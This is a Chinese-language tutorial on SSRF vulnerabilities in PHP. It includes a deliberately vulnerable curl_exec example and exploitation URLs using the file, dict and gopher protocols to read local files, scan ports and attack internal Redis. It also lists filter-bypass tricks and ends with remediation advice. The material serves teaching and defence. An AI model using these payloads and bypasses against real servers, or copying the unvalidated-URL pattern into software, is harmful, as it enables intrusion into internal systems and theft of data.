SSRF漏洞简述:

服务端请求伪造(Server-side Request Forge):是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很多web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统).

SSRF漏洞原理:

由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

SSRF漏洞原理图:

可能导致SSRF漏洞的php函数:

file_get_contents()fsockopen()curl_exec()

SSRF漏洞危害:

探测内网信息攻击内网或本地其他服务利用file协议读取本地文件对内网web应用进行指纹识别端口扫描

示例:(curl_exec函数为例)

<?phpfunction curl($url){      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);}$url = $_GET['url'];curl($url);  ?>  //命名为ssrf.php文件

可以看到当我们给url传入http://www.baidu.com的时候,页面跳转到了百度界面

SSRF漏洞利用:

  • 使用file协议读取内网文件:

http://127.0.0.1/ssrf.php?url=file://E:\phpStudy2018\PHPTutorial\WWW\mima.txt


  • file协议读取后端php文件:(查看源码就可以看到)


  • 使用dict协议探测内网开放端口:

http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:3306  有返回信息,说明端口开放

http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:88 无返回信息,说明端口未开放

  • 使用http/https协议探测开放端口,或者访问其他站点:

  • 使用gopher协议攻击内网服务:

Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。
gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&分隔符也要进行url编码
gopher基本协议格式:gopher://<host>:<port>/<gopher-path>_后接TCP数据流

演示:使用gopher协议访问5555端口

curl gopher://127.0.0.1:5555/_helloworld


可以看到服务端接收到了gopher协议发送的helloworld字段(curl使用http协议)

注意:如果在地址栏利用payload时要再进行一次url编码

http://127.0.0.1:808/test/ssrf/ssrf.php?url=gopher://127.0.0.1:808/_hello%250aworld%25对应%,%0a对应换行
ssrf漏洞结合gopher协议攻击内网redis服务(6379端口)参考https://www.cnblogs.com/-chenxs/p/11749367.html

SSRF漏洞绕过

1.@绕过 : http://www.baidu.com@10.10.10.10与http://10.10.10.10请求是相同的2.ip地址转换成进制绕过:192.168.0.1这个IP地址我们可以改写成：(1)、8进制格式：0300.0250.0.1(2)、16进制格式：0xC0.0xA8.0.1(3)、10进制整数格式：3232235521(4)、16进制整数格式：0xC0A80001 还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.13.利用302 Redirect绕过:我们自己构造一个302.php代码,使用我们的跳转代码去探测内网4.利用非HTTP协议绕过:ftp,gopher,dict,file,ldap5.短网址绕过:http://www.baidu.com<=>http://i7q.cn/6m6XnH6.基于快速网址绕过:http://127.88.23.245:22/?@google.com:80/7.添加端口可能绕过匹配正则:127.0.0.1:808.利用xip.io和xip.name:127.0.0.1.xip.io=127.0.0.19.利用Enclosed alphanumerics:ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com10.利用句号:127。0。0。111.DNS Rebinding（DNS重绑定）

SSRF漏洞修复:

1.限制协议:仅允许http/https协议2.设置url白名单或者限制内网ip:避免应用被用来获取内网数据，攻击内网3.限制端口:限制请求的端口为http常用的端口，比如，80,443,8080,8090。4.过滤返回信息:验证远程服务器对请求的响应是比较简单的方法。5.统一错误信息:避免用户可以根据错误信息来判断远端服务器的端口状态
